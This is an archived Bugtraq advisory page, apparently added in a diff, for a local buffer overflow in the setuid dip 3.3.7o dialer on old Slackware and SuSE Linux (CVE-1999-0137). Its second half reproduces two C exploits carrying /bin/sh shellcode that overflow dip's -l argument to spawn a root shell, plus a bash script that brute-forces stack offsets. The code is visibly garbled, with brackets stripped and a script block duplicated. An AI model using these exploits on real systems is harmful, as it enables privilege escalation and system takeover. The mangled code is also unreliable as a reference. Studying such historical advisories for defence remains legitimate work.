@@ -1,0 +1,135 @@
+#bid86<p><b><span style="font-size: 18pt;">Multiple Vendor dip Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/86/info">info</a><br><a href="http://www.securityfocus.com/bid/86/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/86/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/86/solution">solution</a><br><a href="http://www.securityfocus.com/bid/86/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				86
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-0137<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 05 1998 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 09 2007 08:57PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was made public by Goran Gajic  &lt;ggajic@afrodita.rcub.bg.ac.yu&gt; on Tuesday, May 5 1998, to the BugTraq mailing list.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Fred N. van Kempen dip 3.3.7 o<br/>
+<span class="related">
+						
+							+ 
+						
+						Fred N. van Kempen dip 3.3.7 o-uri<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.0 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 6.3 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 6.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Slackware Linux 3.4 <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x1000/86/dip-exp.c">#exploit_dip-exp.c</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x1000/86/dip-exp2.c">#exploit_dip-exp2.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following exploit code is available:<br/><br/>----- dip-exp.c ----- <br/>/* <br/>  dip 3.3.7o buffer overflow exploit for Linux. (May 7, 1998) <br/>  coded by jamez. e-mail: jamez@uground.org <br/> <br/>  thanks to all ppl from uground. <br/> <br/>  usage: <br/>     gcc -o dip-exp dip3.3.7o-exp.c <br/>     ./dip-exp offset (-100 to 100. probably 0. tested on slack 3.4) <br/>*/ <br/> <br/> <br/>char shellcode = <br/> <br/>"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" <br/> <br/>"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" <br/>        "\x80\xe8\xdc\xff\xff\xff/bin/sh"; <br/> <br/> <br/>#define SIZE 130 <br/>/* cause it's a little buffer, i wont use NOP's */ <br/> <br/>char bufferSIZE; <br/> <br/> <br/>unsigned long get_esp(void) { <br/>   __asm__("movl %esp,%eax"); <br/>} <br/> <br/> <br/>void main(int argc, char * argv) <br/>{ <br/>  int i = 0, <br/>      offset = 0; <br/>  long addr; <br/> <br/> <br/>  if(argc &gt; 1) offset = atoi(argv1); <br/> <br/>  addr = get_esp() - offset - 0xcb; <br/> <br/>  for(i = 0; i &lt; strlen(shellcode); i++) <br/>     bufferi = shellcodei; <br/> <br/>  for (; i &lt; SIZE; i += 4) <br/>  { <br/>     bufferi   =  addr &amp; 0x000000ff; <br/>     bufferi+1 = (addr &amp; 0x0000ff00) &gt;&gt; 8; <br/>     bufferi+2 = (addr &amp; 0x00ff0000) &gt;&gt; 16; <br/>     bufferi+3 = (addr &amp; 0xff000000) &gt;&gt; 24; <br/>  } <br/> <br/>  bufferSIZE - 1 = 0; <br/> <br/>  execl("/sbin/dip", "dip", "-k", "-l", buffer, (char *)0); <br/>} <br/>----- cut here ----- <br/> <br/>Another exploit: <br/> <br/>------------------------------ dipr.c ----------------------------- <br/> <br/>/* <br/> * dip-3.3.7o buffer overrun                            07 May 1998 <br/> * <br/> * sintax: ./dipr &lt;offset&gt; <br/> * <br/> * <br/> *   offset: try increments of 50 between 1500 and 3000 <br/> * <br/> *   tested in linux with dip version 3.3.7o (slak 3.4). <br/> * <br/> *                by zef and r00t @promisc.net <br/> * <br/> *                   http://www.promisc.net <br/> */ <br/> <br/>#include &lt;stdio.h&gt; <br/>#include &lt;stdlib.h&gt; <br/> <br/>static inline getesp() <br/>{ <br/>  __asm__(" movl %esp,%eax "); <br/>} <br/> <br/>main(int argc, char **argv) <br/>{ <br/>  int jump,i,n; <br/>  unsigned long xaddr; <br/>  char *cmd5, buf4096; <br/> <br/> <br/>char code = <br/>  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" <br/>  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" <br/>  "\x80\xe8\xdc\xff\xff\xff/bin/sh"; <br/> <br/>  jump=atoi(argv1); <br/> <br/>  for (i=0;i&lt;68;i++) <br/>    bufi=0x41; <br/> <br/>  for (n=0,i=68;i&lt;113;i++) <br/>    bufi=coden++; <br/> <br/>  xaddr=getesp()+jump; <br/> <br/>  bufi=xaddr &amp; 0xff; <br/>  bufi+1=(xaddr &gt;&gt; 8) &amp; 0xff; <br/>  bufi+2=(xaddr &gt;&gt; 16) &amp; 0xff; <br/>  bufi+3=(xaddr &gt;&gt; 24) &amp; 0xff; <br/> <br/>  bufi+4=xaddr &amp; 0xff; <br/>  bufi+5=(xaddr &gt;&gt; 8) &amp; 0xff; <br/>  bufi+6=(xaddr &gt;&gt; 16) &amp; 0xff; <br/>  bufi+6=(xaddr &gt;&gt; 16) &amp; 0xff; <br/>  bufi+7=(xaddr &gt;&gt; 24) &amp; 0xff; <br/> <br/>  cmd0=malloc(17); <br/>  strcpy(cmd0,"/sbin/dip-3.3.7o"); <br/> <br/>  cmd1=malloc(3); <br/>  strcpy(cmd1,"-k"); <br/> <br/>  cmd2=malloc(3); <br/>  strcpy(cmd2,"-l"); <br/> <br/>  cmd3=buf; <br/> <br/>  cmd4=NULL; <br/> <br/>  execve(cmd0,cmd,NULL); <br/>} <br/> <br/>------------------------------- end ------------------------------- <br/> <br/> <br/>Shell script for easy testing :-) <br/> <br/> <br/>---------------------------- dipr.test ---------------------------- <br/> <br/>#/bin/bash <br/>if  ! -x /sbin/dip-3.3.7o  <br/>then <br/>  echo "could not find file \"/sbin/dip-3.3.7o\""; <br/>  exit -1 <br/>fi <br/>if  ! -u /sbin/dip-3.3.7o  <br/>then <br/>  echo "dip executable is not suid" <br/>  exit -1 <br/>fi <br/>if  ! -x ./dipr  <br/>then <br/>  echo "could not find file \"./dipr\""; <br/>  echo "try compiling dipr.c" <br/>  exit -1 <br/>fi <br/> <br/>x=2000 <br/>false <br/>while  $x -lt 3000 -a $? -ne 0  <br/>fi <br/>if  ! -u /sbin/dip-3.3.7o  <br/>then <br/>  echo "dip executable is not suid" <br/>  exit -1 <br/>fi <br/>if  ! -x ./dipr  <br/>then <br/>  echo "could not find file \"./dipr\""; <br/>  echo "try compiling dipr.c" <br/>  exit -1 <br/>fi <br/> <br/>x=2000 <br/>false <br/>while  $x -lt 3000 -a $? -ne 0  <br/>do <br/>  echo offset=$x <br/>  x=$x+50 <br/>  ./dipr $x <br/>done <br/>rm -f core <br/> <br/>------------------------------- end -------------------------------
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/dip-exp.c">/data/vulnerabilities/exploits/dip-exp.c</a></li>
+<li><a href="/data/vulnerabilities/exploits/dip-exp2.c">/data/vulnerabilities/exploits/dip-exp2.c</a></li>
+</ul>
+</div>
